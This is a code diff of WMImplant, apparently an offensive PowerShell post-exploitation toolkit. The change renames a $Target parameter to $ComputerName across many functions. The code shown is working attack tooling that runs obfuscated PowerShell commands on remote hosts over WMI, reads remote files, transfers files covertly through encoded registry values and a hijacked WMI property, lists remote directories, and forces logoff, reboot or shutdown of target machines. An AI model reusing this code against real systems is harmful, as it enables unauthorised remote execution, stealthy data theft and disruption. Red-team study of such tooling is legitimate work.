                 if($LocalFile)
                 {
                     if($RemoteCredential)
                     {
-                        Get-WMIEventLogins -Creds $RemoteCredential -Target $Computer -FileName $LocalFile
+                        Get-WMIEventLogins -Creds $RemoteCredential -ComputerName $Computer -FileName $LocalFile
                     }
 
                     else
                     {
-                        Get-WMIEventLogins -Target $Computer -FileName $LocalFile
+                        Get-WMIEventLogins -ComputerName $Computer -FileName $LocalFile
                     }
                 }
 
@@ -2779,12 +2780,12 @@ function Invoke-WMImplant
                 {
                     if($RemoteCredential)
                     {
-                        Get-WMIEventLogins -Creds $RemoteCredential -Target $Computer
+                        Get-WMIEventLogins -Creds $RemoteCredential -ComputerName $Computer
                     }
 
                     else
                     {
-                        Get-WMIEventLogins -Target $Computer
+                        Get-WMIEventLogins -ComputerName $Computer
                     }
                 }
             }
@@ -2792,63 +2793,63 @@ function Invoke-WMImplant
 
         elseif($LogOff)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Invoke-PowerOptionsWMI -Creds $RemoteCredential -Target $Computer -Logoff
+                    Invoke-PowerOptionsWMI -Creds $RemoteCredential -ComputerName $Computer -Logoff
                 }
 
                 else
                 {
-                    Invoke-PowerOptionsWMI -Target $Computer -Logoff
+                    Invoke-PowerOptionsWMI -ComputerName $Computer -Logoff
                 }
             }
         }
 
         elseif($Reboot)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Invoke-PowerOptionsWMI -Creds $RemoteCredential -Target $Computer -Reboot
+                    Invoke-PowerOptionsWMI -Creds $RemoteCredential -ComputerName $Computer -Reboot
                 }
 
                 else
                 {
-                    Invoke-PowerOptionsWMI -Target $Computer -Reboot
+                    Invoke-PowerOptionsWMI -ComputerName $Computer -Reboot
                 }
             }
         }
 
         elseif($PowerOff)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Invoke-PowerOptionsWMI -Creds $RemoteCredential -Target $Computer -Shutdown
+                    Invoke-PowerOptionsWMI -Creds $RemoteCredential -ComputerName $Computer -Shutdown
                 }
 
                 else
                 {
-                    Invoke-PowerOptionsWMI -Target $Computer -Shutdown
+                    Invoke-PowerOptionsWMI -ComputerName $Computer -Shutdown
                 }
             }
         }
@@ -3370,7 +3371,7 @@ function Find-FileWMImplant
         [Parameter(Mandatory = $False)]
         [System.Management.Automation.PSCredential]$Creds,
         [Parameter(Mandatory = $False)]
-        [string]$Target,
+        [string]$ComputerName,
         [Parameter(Mandatory = $False)]
         [string]$File,
         [Parameter(Mandatory = $False)]
@@ -3381,10 +3382,10 @@ function Find-FileWMImplant
 
     process
     {
-        if(!$Target)
+        if(!$ComputerName)
         {
-            $Target = Read-Host "What system are you targeting? >"
-            $Target = $Target.Trim()
+            $ComputerName = Read-Host "What system are you targeting? >"
+            $ComputerName = $ComputerName.Trim()
         }
 
         if(!$Drive)
@@ -3512,11 +3513,11 @@ function Find-FileWMImplant
 
         if($Creds)
         {
-            Get-WmiObject -Class cim_datafile -filter $filter -ComputerName $Target -Credential $Creds
+            Get-WmiObject -Class cim_datafile -filter $filter -ComputerName $ComputerName -Credential $Creds
         }
         else
         {
-            Get-WmiObject -Class cim_datafile -filter $filter -ComputerName $Target
+            Get-WmiObject -Class cim_datafile -filter $filter -ComputerName $ComputerName
         }
     }
 }
@@ -3529,7 +3530,7 @@ function Get-FileContentsWMImplant
         [Parameter(Mandatory = $False)]
         [System.Management.Automation.PSCredential]$Creds,
         [Parameter(Mandatory = $False)]
-        [string]$Target,
+        [string]$ComputerName,
         [Parameter(Mandatory = $False)]
         [string]$File
     )
@@ -3537,10 +3538,10 @@ function Get-FileContentsWMImplant
     Process
     {
 
-        if(!$Target)
+        if(!$ComputerName)
         {
-            $Target = Read-Host "What system are you targeting? >"
-            $Target = $Target.Trim()
+            $ComputerName = Read-Host "What system are you targeting? >"
+            $ComputerName = $ComputerName.Trim()
         }
 
         if(!$File)
@@ -3552,11 +3553,11 @@ function Get-FileContentsWMImplant
         # Keep original WMI Property Value
         if($Creds)
         {
-            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds).DebugFilePath
+            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Creds).DebugFilePath
         }
         else
         {
-            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target).DebugFilePath
+            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName).DebugFilePath
         }
 
         # On remote system, save file to registry
@@ -3565,11 +3566,11 @@ function Get-FileContentsWMImplant
 
         if($Creds)
         {
-            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -Creds $creds -ObfuscateWithEnvVar
+            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -Creds $creds -ObfuscateWithEnvVar
         }
         else
         {
-            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -ObfuscateWithEnvVar
+            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -ObfuscateWithEnvVar
         }
 
         # Poll remote system, and determine if the script is done
@@ -3580,11 +3581,11 @@ function Get-FileContentsWMImplant
             Write-Verbose "Polling property to see if the script has completed"
             if($Creds)
             {
-                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds
+                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Creds
             }
             else
             {
-                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target
+                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName
             }
             
             try 
@@ -3630,7 +3631,7 @@ function Invoke-FileTransferWMImplant
         [Parameter(Mandatory = $False)]
         [System.Management.Automation.PSCredential]$Creds,
         [Parameter(Mandatory = $False)]
-        [string]$Target,
+        [string]$ComputerName,
         [Parameter(Mandatory = $False,ParameterSetName='download')]
         [switch]$Download,
         [Parameter(Mandatory = $False,ParameterSetName='upload')]
@@ -3662,10 +3663,10 @@ function Invoke-FileTransferWMImplant
         $SystemHostname = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name
 
         # Get information needed to transfer the file
-        if(!$Target)
+        if(!$ComputerName)
         {
-            $Target = Read-Host "What system are you targeting? >"
-            $Target = $Target.Trim()
+            $ComputerName = Read-Host "What system are you targeting? >"
+            $ComputerName = $ComputerName.Trim()
         }
 
         if($Download)
@@ -3696,11 +3697,11 @@ function Invoke-FileTransferWMImplant
 
             if($Creds)
             {
-                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -Creds $Creds -ObfuscateWithEnvVar
+                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -Creds $Creds -ObfuscateWithEnvVar
             }
             else
             {
-                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -ObfuscateWithEnvVar
+                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -ObfuscateWithEnvVar
             }
 
             # Start the polling process to see if the file is stored in the registry
@@ -3711,11 +3712,11 @@ function Invoke-FileTransferWMImplant
             {
                 if($Creds)
                 {
-                    $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
+                    $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $ComputerName -Credential $Creds
                 }
                 else
                 {
-                    $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target
+                    $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $ComputerName
                 }
                 if($remote_reg.ReturnValue -ne 0)
                 {
@@ -3737,11 +3738,11 @@ function Invoke-FileTransferWMImplant
 
             if($Creds)
             {
-                $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
+                $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $ComputerName -Credential $Creds
             }
             else
             {
-                $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target
+                $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $ComputerName
             }
 
             Write-Verbose "Done!"
@@ -3777,23 +3778,23 @@ function Invoke-FileTransferWMImplant
             Write-Verbose "Writing encoded file to remote registry"
             if($Creds)
             {
-                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'SetStringValue' -ArgumentList $reghive, $regpath, $filecontentencoded, $registryupname -ComputerName $Target -Credential $Creds
+                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'SetStringValue' -ArgumentList $reghive, $regpath, $filecontentencoded, $registryupname -ComputerName $ComputerName -Credential $Creds
             }
             else
             {
-                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'SetStringValue' -ArgumentList $reghive, $regpath, $filecontentencoded, $registryupname -ComputerName $Target
+                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'SetStringValue' -ArgumentList $reghive, $regpath, $filecontentencoded, $registryupname -ComputerName $ComputerName
             }
             
             # grabs registry value and saves to disk
-            Write-Verbose "Connecting to $Target"
+            Write-Verbose "Connecting to $ComputerName"
             $remote_command = '$Hive = 2147483650; $key = ''' + "$regpath'" + '; $value = ''' + "$registryupname" + '''; $out = Invoke-WmiMethod -Namespace ''root\default'' -Class ''StdRegProv'' -Name ''GetStringValue'' -ArgumentList $Hive, $key, $value; $decode = [byte[]][int[]]$out.sValue.Split('','') -Join '' ''; [byte[]] $decoded = $decode -split '' ''; Set-Content -Encoding byte -Path ' + "$Upload_Dir" + ' -Value $decoded; Remove-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registryupname'"
             if($Creds)
             {
-                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -Creds $creds -ObfuscateWithEnvVar
+                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -Creds $creds -ObfuscateWithEnvVar
             }
             else
             {
-                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -ObfuscateWithEnvVar
+                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -ObfuscateWithEnvVar
             }
 
             Write-Verbose "Remote system now is copying file from WMI property and replacing it to the original value."
@@ -3811,17 +3812,17 @@ function Invoke-LSWMImplant
         [Parameter(Mandatory = $False)]
         [System.Management.Automation.PSCredential]$Creds,
         [Parameter(Mandatory = $False)]
-        [string]$Target,
+        [string]$ComputerName,
         [Parameter(Mandatory = $False)] 
         [string]$Directory
     )
 
     Process
     {
-        if(!$Target)
+        if(!$ComputerName)
         {
-            $Target = Read-Host "What system are you targeting? >"
-            $Target = $Target.Trim()
+            $ComputerName = Read-Host "What system are you targeting? >"
+            $ComputerName = $ComputerName.Trim()
         }
 
         if(!$Directory)
@@ -3837,18 +3838,18 @@ function Invoke-LSWMImplant
         {
             $DirPath += "\\"
         }
-        Write-Verbose "Connecting to $Target"
+        Write-Verbose "Connecting to $ComputerName"
         $filter = "Drive='$Drive' and Path='$DirPath'"
 
         if($Creds)
         {
-            Get-WmiObject -Class Win32_Directory -Filter $filter -ComputerName $Target -Credential $Creds
-            Get-WMIObject -Class CIM_Datafile -filter $filter -ComputerName $Target -Credential $Creds
+            Get-WmiObject -Class Win32_Directory -Filter $filter -ComputerName $ComputerName -Credential $Creds
+            Get-WMIObject -Class CIM_Datafile -filter $filter -ComputerName $ComputerName -Credential $Creds
         }
         else
         {
-            Get-WmiObject -Class Win32_Directory -Filter $filter -ComputerName $Target
-            Get-WMIObject -Class CIM_Datafile -filter $filter -ComputerName $Target
+            Get-WmiObject -Class Win32_Directory -Filter $filter -ComputerName $ComputerName
+            Get-WMIObject -Class CIM_Datafile -filter $filter -ComputerName $ComputerName
         }
     }
     end{}
@@ -3863,26 +3864,26 @@ function Set-OriginalProperty
         [Parameter(Mandatory = $False)]
         [System.Management.Automation.PSCredential]$Creds,
         [Parameter(Mandatory = $False)]
-        [string]$Target
+        [string]$ComputerName
     )
 
     Process
     {
-        if(!$Target)
+        if(!$ComputerName)
         {
-            $Target = Read-Host "What system are you targeting? >"
-            $Target = $Target.Trim()
+            $ComputerName = Read-Host "What system are you targeting? >"
+            $ComputerName = $ComputerName.Trim()
         }
 
         $default_prop_value = "%SystemRoot%\Memory.dmp"
         # Set original WMI Property Value
         if($Creds)
         {
-            $Original_WMIProperty = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds
+            $Original_WMIProperty = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Creds
         }
         else
         {
-            $Original_WMIProperty = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target
+            $Original_WMIProperty = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName
         }
         $Original_WMIProperty.DebugFilePath = $default_prop_value
         $Original_WMIProperty.Put()
